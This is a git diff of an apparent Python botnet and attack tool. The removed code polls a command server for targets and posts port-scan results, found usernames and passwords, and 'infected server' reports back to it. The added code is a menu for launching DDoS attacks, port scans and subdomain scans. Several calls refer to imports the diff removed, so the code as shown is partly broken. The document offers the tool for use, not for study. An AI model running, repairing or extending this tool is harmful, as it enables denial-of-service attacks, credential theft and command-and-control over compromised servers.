@@ -3,96 +3,68 @@ import socket
 import time
 import threading
 import socket
+from tqdm import tqdm
+from ddos import perform_ddos_attack_wrapper
 
-from ddos import ddos
 
-from brut import brute
+from menu import display_menu
+
+from port_scan import port_scan
+
+from subdomain import scan_subdomains
+
+#from api import get_target, add_target, submi
+
+#from brut import brute
 
 BASE_URL = "base.url"
 
-def add_target(ip, attack_type, port=None, priority=1):
-    url = f"{BASE_URL}/add_target"
-    data = {
-        "ip": ip,
-        "type": attack_type,
-        "port": port,
-        "priority": priority
-    }
-    response = requests.post(url, json=data)
-    return response.json()
 
-def submit_results(data):
-    url = f"{BASE_URL}/submit_results"
-    response = requests.post(url, json=data)
-    return response.json()
-
-def get_target():
-    url = f"{BASE_URL}/get_target"
-    response = requests.get(url)
-    return response.json()
-
-def notify_credentials_found(ip, username, password):
-    url = f"{BASE_URL}/notify_credentials_found"
-    data = {
-        "credentials": {
-            "ip": ip,
-            "username": username,
-            "password": password
-        }
-    }
-    response = requests.post(url, json=data)
-    return response.json()
-
-def notify_infected_server(ip_address):
-    url = f"{BASE_URL}/notify_infected_server"
-    data = {
-        "ip_address": ip_address
-    }
-    response = requests.post(url, json=data)
-    return response.json()
-
-def perform_port_scan(ip, start_port, end_port):
-    open_ports = []
-    for port in range(start_port, end_port + 1):
-        try:
-            # Create a socket object
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(1)
-
-            # Check if the port is open
-            result = sock.connect_ex((ip, port))
-            if result == 0:
-                open_ports.append(port)
-
-            sock.close()
-        except Exception as e:
-            print(f"Error during port scan: {str(e)}")
-
-    # Send results back to the server
-    results_data = {"ip": ip, "open_ports": open_ports}
-    submit_results(results_data)
-    return open_ports
 
 def perform_ddos_attack(target_ip, target_port=80, additional_info={}):
     # Implement your DDoS attack logic here
-    print(f"Performing DDoS attack on {ip}")
-
+    print(f"Performing DDoS attack on {target_ip}")
 
     ssl = additional_info.get("ssl", False)
 
     method = additional_info.get("method", None)
-    
+
     ddos(target_ip, target_port, ssl, method)
 
 
 def perform_bruteforce_attack(ip, username, password_list):
     # Implement your bruteforce attack logic here
-    print(f"Performing bruteforce attack on {ip} with username {username} and password list {password_list}")
+    print(
+        f"Performing bruteforce attack on {ip} with username {username} and password list {password_list}"
+    )
     brute(ip)
-    
+
+
 def perform_aggressive_bruteforce_attack(ip):
     # Implement your aggressive bruteforce attack logic here
     print(f"Performing aggressive bruteforce attack on {ip}")
+
+
+def valikko():
+    while True:
+        display_menu()
+        select = input("Select function (q to quit): ")
+
+        if select == '0':
+            perform_ddos_attack_wrapper()
+        elif select == '1':
+            port_scan()
+        elif select == '2':
+            print("Bruteforce function not implemented")
+        elif select == '3':
+            scan_subdomains()
+        elif select.lower() == 'q':
+            print("Exiting program.")
+            break
+        else:
+            print("Invalid option. Please choose a valid option.")
+
+valikko()
 
 # Example usage
 while True:
@@ -105,7 +77,9 @@ while True:
         target_priority = target_response["priority"]
         additional_info = target_response["additional_info"]
 
-        print(f"Received target: IP - {target_ip}, Type - {target_type}, Port - {target_port}, Priority - {target_priority}")
+        print(
+            f"Received target: IP - {target_ip}, Type - {target_type}, Port - {target_port}, Priority - {target_priority}"
+        )
 
         # Simulate adding the target to the attack list
         add_target(target_ip, target_type, target_port, target_priority)
@@ -129,3 +103,5 @@ while True:
 
     # Sleep for a while before the next iteration
     time.sleep(60)  # Sleep for 60 seconds before the next iteration
+
+
